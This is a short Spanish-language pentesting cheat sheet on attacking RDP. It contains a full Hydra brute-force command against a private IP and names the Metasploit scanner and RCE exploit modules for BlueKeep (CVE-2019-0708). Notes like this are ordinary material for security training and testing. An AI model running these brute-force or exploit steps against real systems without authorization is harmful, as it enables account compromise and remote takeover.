# RDP

## Fuerza Bruta

### Hydra

Para hacer fuerza bruta usamos hydra de la siguiente forma:

```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://192.168.1.1 -s 3333
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## BlueKeep (CVE-2019-0708)

{% hint style="info" %}
BlueKeep (CVE-2019-0708) es una vulnerabilidad crítica en el servicio de Remote Desktop Protocol (RDP) de Microsoft Windows. Esta vulnerabilidad permite la ejecución remota de código en sistemas vulnerables, lo que significa que un atacante puede tomar el control de un equipo afectado sin necesidad de credenciales de usuario

Algunos S.O. afectados:

* Windows XP
* Windows Vista
* Windows 7
* Windows Server 2003
* Windows Server 2008 & R2
{% endhint %}

### Detección

Podemos usar el siguiente modulo de metasploit:

```bash
/auxiliary/scanner/rdp/cve_2019_0708_bluekeep
```

<figure><img src="../../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

### Explotación

Podemos usar el siguiente modulo de metasploit:

```bash
/exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

<figure><img src="../../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>
